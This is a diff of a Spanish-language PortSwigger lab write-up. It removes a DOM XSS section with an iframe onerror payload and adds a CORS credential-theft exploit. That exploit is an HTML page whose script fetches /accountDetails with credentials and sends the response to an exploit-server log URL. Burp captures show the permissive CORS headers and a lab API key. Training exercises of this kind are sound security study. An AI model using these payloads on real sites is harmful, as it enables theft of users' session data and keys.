@@ -1,40 +1,5 @@
 # 👨‍🏫 WRITEUP RESUMEN
 
-<details>
-
-<summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
-
-### AUDITORIA DE: ((Laboratorio: DOM XSS en el receptor del selector jQuery usando un evento hashchange))
-
-***
-
-***
-
-#### RECONOCIMIENTO PASIVO
-
-*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    SCRIPT:
-
-
-    $(window).on('hashchange', function(){
-        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + 
-    ')');
-        if (post) post.get(0).scrollIntoView();
-    });
-    ```
-
-    ![DOM-XSSenSelectorEventoHASHCHANGE](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/a170860c-2a92-4d05-ad6e-8c8978af4742)
-
-    * CONCLUSION: ENCONTRAMOS EN EL HTML DEL HOME EL SCRIPT QUE MANEJA EL SELECTOR JQUERY EN EL EVENTO HASHCHANGE.
-
-***
-
-***
-
-</details>
-
 🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫
 
 <details>
@@ -1262,10 +1227,41 @@
 *   [x] PORTSWIGGER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    <iframe src="https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+    ------------
+
+    SCRIPT PORTSWIGGER:
+
+
+
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Ataque P4IM0N- CORS BASICO</title>
+    </head>
+    <body>
+        <h1>Ataque P4IM0N- CORS BASICO</h1>
+
+        <script>
+            var req = new XMLHttpRequest();
+    	req.onload = reqListener;
+    	req.open('get','https://0a07004204c8745680c430b10063004a.web-security-academy.net/accountDetails',true);
+    	req.withCredentials = true;
+    	req.send();
+
+    	function reqListener() {
+    	   location='https://exploit-0a9600db049e7471803e2fc7012300e3.exploit-server.net/log?key='+this.responseText;
+    	};
+        </script>
+    </body>
+    </html>
+
+
+    -----------
     ```
 
-    * CONCLUSION:NO SE TERMINO DE COMPRENDER BIEN LA EJECUCION; PERO TUVIMOS QUE MANDAR ESTA CARGA UTIL DESDE NEUSTRO SERVIDOR MALISIOSO A LA VICTIMA Y A ESTA SE ELE EJECUTARIA LAS OPCIONES DE IMPRECION DE LA URL INDICADA EN SRC Y NADAD MAS; SE COMPLICO HASTA QUE AL FIN LO TOMO EL LABORATORIO, LUEGO DE PROBAR MUCHAS CARGAS POR NUESTRA CUENTA.
+    * CONCLUSION:CORROVOIRAMOS EN LA SOLICITUD DE ACOUNTDETAILING QUE PODEMOS CARGAR UN ORIGEN CRUZADO Y NOS RESPONDE CON Access-Control-Allow-Origin: www.paimon.com y Access-Control-Allow-Credentials: true COMPROBANDO ASI QUE PODEMOS REALIZAR UNA SOLICITUD CRUZADA A TARVES DE NUESTRO SERVIDOR MALISIOSO Y EL USUARIO VICTIMA, CONSIGUIENDO CON NUESTRO SCRIPT LAS CREDENCIALES DEL MISMO SIENDO ESTAS DE ADMINISTRADOR .
 
 ***
 
@@ -1284,143 +1280,57 @@
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
-    REQUEST NORMAL :
+    -----------
 
 
 
 
-    GET /post?postId=5 HTTP/2
-    Host: 0a96001003dc9730810d5ce400eb00b6.web-security-academy.net
-    Cookie: session=hrpstTIw3ZNzjsMATxZisZXH5xrq9PVC
-    Cache-Control: max-age=0
-    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
-    Sec-Ch-Ua-Mobile: ?0
-    Sec-Ch-Ua-Platform: "Linux"
-    Upgrade-Insecure-Requests: 1
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-User: ?1
-    Sec-Fetch-Dest: document
-    Referer: https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/
+    BURPSUITE:
+
+
+
+    REQUEST PROBANDO VULNERABILIDAD DE CORS:
+
+
+    GET /accountDetails HTTP/2
+    Host: 0a07004204c8745680c430b10063004a.web-security-academy.net
+    Cookie: session=N4UJ5CunIzLnq0qH6hBhV7rBib4jtgRI
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate, br
-    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Referer: https://0a07004204c8745680c430b10063004a.web-security-academy.net/my-account?id=wiener
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: same-origin
+    Te: trailers
+    Origin: www.paimon.com
 
 
 
 
 
-    RESPONSE NORMAL:
-
+    RESPONSE PROBANDO VULNERABILIDAD DE CORS:
 
 
     HTTP/2 200 OK
-    Content-Type: text/html; charset=utf-8
-    Content-Length: 7088
+    Access-Control-Allow-Origin: www.paimon.com
+    Access-Control-Allow-Credentials: true
+    Content-Type: application/json; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 149
 
-    <!DOCTYPE html>
-    <html>
-        <head>
-            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
-            <link href=/resources/css/labsBlog.css rel=stylesheet>
-            <title>DOM XSS in jQuery selector sink using a hashchange event</title>
-        </head>
-        <body>
-            <script src="/resources/labheader/js/labHeader.js"></script>
-            <div id="academyLabHeader">
-                <section class='academyLabBanner'>
-                    <div class=container>
-                        <div class=logo></div>
-                            <div class=title-container>
-                                <h2>DOM XSS in jQuery selector sink using a hashchange event</h2>
-                                <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ae00026033497c481d25bd20118000d.exploit-server.net'>Go to exploit server</a>
-                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event'>
-                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
-                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
-                                        <g>
-                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
-                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
-                                        </g>
-                                    </svg>
-                                </a>
-                            </div>
-                            <div class='widgetcontainer-lab-status is-notsolved'>
-                                <span>LAB</span>
-                                <p>Not solved</p>
-                                <span class=lab-status-icon></span>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-            </div>
-            <div theme="blog">
-                <section class="maincontainer">
-                    <div class="container is-page">
-                        <header class="navigation-header">
-                            <section class="top-links">
-                                <a href=/>Home</a><p>|</p>
-                            </section>
-                        </header>
-                        <header class="notification-header">
-                        </header>
-                        <div class="blog-post">
-                        <img src="/image/blog/posts/57.jpg">
-                        <h1>Swipe Left Please</h1>
-                        <p><span id=blog-author>Scott Com</span> | 12 February 2024</p>
-                        <hr>
-                        <p>I don&apos;t know if you&apos;ve ever been on a dating site, but if you&apos;re female I&apos;d suggest you don&apos;t waste your time. And trust me, if you think by paying for a subscription you&apos;ll get a better selection of potential suitors, think again.</p>
-                        <p>The gallery of images looks like those books they whip out in CSI, a book of mugshots so a witness can identify the perpetrator. Honestly, they all look like convicts, mostly serial killers. I physically recoiled when I started browsing through. I don&apos;t want to appear mean, but I&apos;m thinking if you&apos;re looking to attract a female; a shave, maybe a shower, would be the right step before taking that selfie. And what&apos;s with the ski wear? Head covered, eyes covered by goggles, what are they trying to hide? If they think they look worse than the others, and are in disguise, I don&apos;t want to invite them to take the ski gear off.</p>
-                        <p>I took an unflattering photo, not easy for me as I&apos;m a big fan of the beauty filter. But, I was only there to see what goes on behind the scenes. My profile information offered up the bare minimum to meet the required word count. And yet, within the space of 5 minutes, I&apos;d had 25 views, one message, and a wink. That to me screams desperate. Trust me, my profile didn&apos;t suggest I was much of a catch.</p>
-                        <p>I couldn&apos;t read the message, if I wanted to I needed to put my hand in my wallet. I was teased with the first few words. It read, &apos;I can&apos;t because I&apos;m on a free trial&apos;. What a tight ass. If you want to communicate with me, don&apos;t send me a message I can&apos;t read so I have to shell out the money.</p>
-                        <p>There was a small part of me that momentarily thought it was a little bit exciting, and I might find a knight in shining armor. But not to be, 8 minutes in and I deleted my account.</p>
-                        <div/>
-                        <hr>
-                        <h1>Comments</h1>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            El Bow | 20 February 2024
-                            </p>
-                            <p>Could you do a blog on the needy? I want to show my husband he&apos;s always whining about nothing.</p>
-                            <p></p>
-                        </section>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Peg Up | 01 March 2024
-                            </p>
-                            <p>I can&apos;t say I&apos;m surprised you wrote this.</p>
-                            <p></p>
-                        </section>
-                        <hr>
-                        <section class="add-comment">
-                            <h2>Leave a comment</h2>
-                            <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
-                                <input required type="hidden" name="csrf" value="Uy0SoJbkY9bWyecJrRz9nESJsH3BfCuB">
-                                <input required type="hidden" name="postId" value="5">
-                                <label>Comment:</label>
-                                <textarea required rows="12" cols="300" name="comment"></textarea>
-                                        <label>Name:</label>
-                                        <input required type="text" name="name">
-                                        <label>Email:</label>
-                                        <input required type="email" name="email">
-                                        <label>Website:</label>
-                                        <input pattern="(http:|https:).+" type="text" name="website">
-                                <button class="button" type="submit">Post Comment</button>
-                            </form>
-                        </section>
-                        <div class="is-linkback">
-                            <a href="/">Back to Blog</a>
-                        </div>
-                    </div>
-                </section>
-                <div class="footer-wrapper">
-                </div>
-            </div>
-        </body>
-    </html>
+    {
+      "username": "wiener",
+      "email": "",
+      "apikey": "sBRm4duBP5hr1kPOZP0BMAq79eDELRLM",
+      "sessions": [
+        "N4UJ5CunIzLnq0qH6hBhV7rBib4jtgRI"
+      ]
+    }
     ```
 
-    * CONCLUSION: NO SE OBSERVA NADA.
+    * CONCLUSION: CORROVOIRAMOS EN LA SOLICITUD DE ACOUNTDETAILING QUE PODEMOS CARGAR UN ORIGEN CRUZADO Y NOS RESPONDE CON Access-Control-Allow-Origin: www.paimon.com y Access-Control-Allow-Credentials: true COMPROBANDO ASI QUE PODEMOS REALIZAR UNA SOLICITUD CRUZADA A TARVES DE NUESTRO SERVIDOR MALISIOSO Y EL USUARIO VICTIMA, CONSIGUIENDO CON NUESTRO SCRIPT LAS CREDENCIALES DEL MISMO SIENDO ESTAS DE ADMINISTRADOR .
 
 ***
 
